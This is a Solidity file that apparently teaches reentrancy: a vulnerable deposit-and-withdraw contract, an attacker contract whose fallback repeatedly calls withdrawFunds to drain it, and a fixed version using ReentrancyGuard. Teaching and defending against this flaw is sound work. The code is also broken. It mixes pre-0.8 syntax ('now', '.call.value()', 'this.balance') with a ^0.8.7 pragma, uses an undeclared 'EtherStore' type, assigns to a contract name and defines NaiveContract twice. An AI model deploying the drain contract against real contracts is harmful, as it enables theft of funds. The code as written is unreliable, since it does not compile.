// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// First Contract (The naive contract) 
contract NaiveContract {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
 
// Second Contract (The malicious contract)

import "NaiveContract.sol";

contract MaliciousContract {
  EtherStore public etherStore;

  // initialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      NaiveContract = NaiveContract(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      NaiveContract.depositFunds.value(1 ether)();
      // start the magic
      NaiveContract.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (NaiveContract.balance > 1 ether) {
          NaiveContract.withdrawFunds(1 ether);
      }
  }
}

// Third contract (The right way to do it)

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract NaiveContract is ReentrancyGuard {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public nonReentrant {

        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
 

        require(msg.sender.call.value(_weiToWithdraw)());
        

    }
 }
